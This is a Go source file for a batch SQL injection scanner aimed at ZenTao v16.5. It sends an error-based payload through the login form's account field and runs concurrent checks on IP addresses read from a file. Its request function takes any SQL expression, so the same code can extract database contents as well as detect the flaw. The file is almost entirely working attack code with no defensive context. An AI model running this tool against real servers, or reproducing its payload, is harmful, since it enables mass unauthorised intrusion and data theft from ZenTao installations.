package main

import (
	"bufio"
	"crypto/md5"
	"fmt"
	"github.com/imroc/req/v3"
	"io"
	"math/rand"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var wg sync.WaitGroup

type ZentaoSqli struct {
}

func NewZentaoSQLI() *ZentaoSqli {
	return &ZentaoSqli{}
}

func (z *ZentaoSqli) SqliResp(order string, ip string) (*req.Response, error) {
	client := req.C()
	rep, err := client.R().SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36").
		SetHeader("Accept", "application/json, text/javascript, */*; q=0.01").
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		SetHeader("Referer", "http://"+ip+"/zentao/user-login.html").
		SetBody("account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28" + url.QueryEscape(order) + "%29%2C0x7e%29%29%29%23").
		Post("http://" + ip + "/zentao/user-login.html")
	if err != nil {
		return nil, err
	}
	return rep, nil
}

func (z *ZentaoSqli) SqliScan(ip string, single bool) {
	defer func() {
		err := recover()
		if err != nil {
			fmt.Println("[ERRO]:", err)
			return
		}
	}()

	randNum := z.RandInt()
	rep, err := z.SqliResp("MD5("+randNum+")", ip)
	if err != nil {
		panic(err)
	}

	MD5Num := z.Get16MD5(randNum)
	if strings.Contains(rep.String(), MD5Num) {
		fmt.Printf("[INFO]:[%s] zentao V16.5 SQL Injection Existent\n", ip)
	} else {
		fmt.Printf("[INFO]:[%s] zentao V16.5 SQL Injection Non-existent\n", ip)
	}
	if !single {
		defer wg.Done()
	}
}

func (z *ZentaoSqli) Get16MD5(randNum string) string {
	newSig := md5.Sum([]byte(randNum))
	newMD5 := fmt.Sprintf("%x", newSig)
	return newMD5[8:24]
}

func (z *ZentaoSqli) RandInt() string {
	rand.Seed(time.Now().UnixNano())
	r1 := rand.Intn(10)
	r2 := rand.Intn(10)
	sum := r1 + r2
	return strconv.Itoa(sum)
}

func (z *ZentaoSqli) BatchSqliScan(path string) {

	done := make(chan bool)
	begin := time.Now()
	fmt.Println("[INFO]:Scan...")
	f, err := os.Open(path)

	if err != nil {
		fmt.Println("os.Open Err", err)
		return
	}

	r := bufio.NewReader(f)

	for {
		ip, err := r.ReadString('\n')
		ip = strings.TrimSpace(ip)
		if err != nil && err != io.EOF {
			fmt.Println("os.Open Err", err)
			return
		}
		if ip != "" {
			go func() {
				wg.Wait()
				done <- true
			}()

			wg.Add(1)
			go z.SqliScan(ip, false)

			select {
			case <-done:

			case <-time.After(time.Second * 2):
			}
		}
		if err == io.EOF {
			break
		}

	}
	timeDif := time.Now().Sub(begin)
	fmt.Println("[INFO]:Take", timeDif)
}
